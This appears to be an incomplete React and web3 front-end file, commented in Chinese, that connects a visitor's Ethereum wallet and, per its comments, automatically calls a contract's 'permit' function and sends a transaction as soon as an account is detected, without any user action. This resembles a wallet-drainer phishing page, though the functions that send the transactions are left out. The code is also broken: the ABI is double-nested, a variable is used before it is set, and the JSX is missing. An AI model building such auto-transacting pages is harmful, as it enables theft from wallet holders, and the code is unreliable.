import React, { useState, useEffect } from 'react';
import Web3Modal from 'web3modal';
import Web3 from 'web3';

const CONTRACT_ADDRESS = "0xd9145CCE52D386f254917e481eB44e9943F39138";
const CONTRACT_ABI = [ [
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "authorizer",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			},
			{
				"indexed": false,
				"internalType": "bytes",
				"name": "signature",
				"type": "bytes"
			}
		],
		"name": "PermitUsed",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			},
			{
				"internalType": "bytes",
				"name": "signature",
				"type": "bytes"
			}
		],
		"name": "permit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
 ];

function App() {
  const [account, setAccount] = useState(null);
  const [web3, setWeb3] = useState(null);
  const [contract, setContract] = useState(null);

  useEffect(() => {
    // 检查是否支持EIP-1193接口
    if (window.ethereum) {
      // 尝试自动连接到钱包
      window.ethereum.request({ method: 'eth_accounts' }).then(function(accounts) {
          if (accounts.length > 0) {
              // 用户已连接，获取第一个账户
              setAccount(accounts[0]);
              initWeb3(window.ethereum); // 初始化Web3
          } else {
              // 创建 Web3Modal 实例
              const web3Modal = new Web3Modal({
                network: "mainnet",
                cacheProvider: true,
              });
              connectWallet(web3Modal);
          }
      }).catch(function(error) {
          console.error(error);
      });
    } else {
      console.log('Please use a wallet that supports the EIP-1193 interface.');
    }
  }, []);

  const initWeb3 = (provider) => {
    const web3Instance = new Web3(provider);
    setWeb3(web3Instance);
  };

  useEffect(() => {
    if (web3 && account) {
      const contractInstance = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
      setContract(contractInstance);

      // 自动调用合约方法
      callContractFunction();
      // 自动发送交易到合约
      sendTransactionToContract();
    }
  }, [web3, account]);

  const connectWallet = async (web3Modal) => {
    try {
      const provider = await web3Modal.connect();
      initWeb3(provider); // 初始化Web3
      const accounts = await web3.eth.getAccounts();
      if (accounts.length > 0) {
        setAccount(accounts[0]);
      } else {
        console.error('未找到账户');
      }
    } catch (error) {
      console.error('连接钱包失败:', error);
    }
  };

  // ...其他函数保持不变...

  return (
    // ...JSX 保持不变...
  );
}

export default App;